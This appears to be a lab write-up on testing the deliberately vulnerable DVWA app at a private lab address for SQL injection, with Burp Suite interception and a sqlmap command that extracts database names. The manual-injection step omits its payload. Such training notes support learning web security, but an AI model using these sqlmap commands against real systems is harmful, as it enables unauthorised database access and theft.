# SQL Injection

## 🎯 Objective
Test if the target web application is vulnerable to SQL Injection by injecting SQL payloads into form inputs and observing the behavior of the database responses.

---

## 💻 Target Info
- **Target IP**: 192.168.56.105  
- **Service**: HTTP (Port 80)  
- **App Used**: DVWA (SQL Injection Module)  
- **Tools Used**: `browser`, `burpsuite`, `sqlmap`

---

## 🧪 Steps

### 🔹 Step 1: Access the Login/Input Page
Go to:  
```
`http://192.168.56.105/dvwa/vulnerabilities/sqli/`  
Use low/medium/high security levels.
```

---

### 🔹 Step 2: Manual Injection (Basic Test)
In the input box, try injecting:

Result:  
```
All users are returned without authentication → **SQLi confirmed**
```
---

### 🔹 Step 3: Capture the Request (Optional)
```
Use Burp Suite to intercept the request and extract the vulnerable parameter.
```
---

### 🔹 Step 4: Automate with SQLMap
```bash
sqlmap -u "http://192.168.56.105/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=xxxx; security=low" \
--dbs
```
✅ Output: Database names extracted successfully.

📌 Notes
```
DVWA allows switching security levels. Try on both low and medium.
Use --risk and --level flags in SQLMap to get deeper results.
```
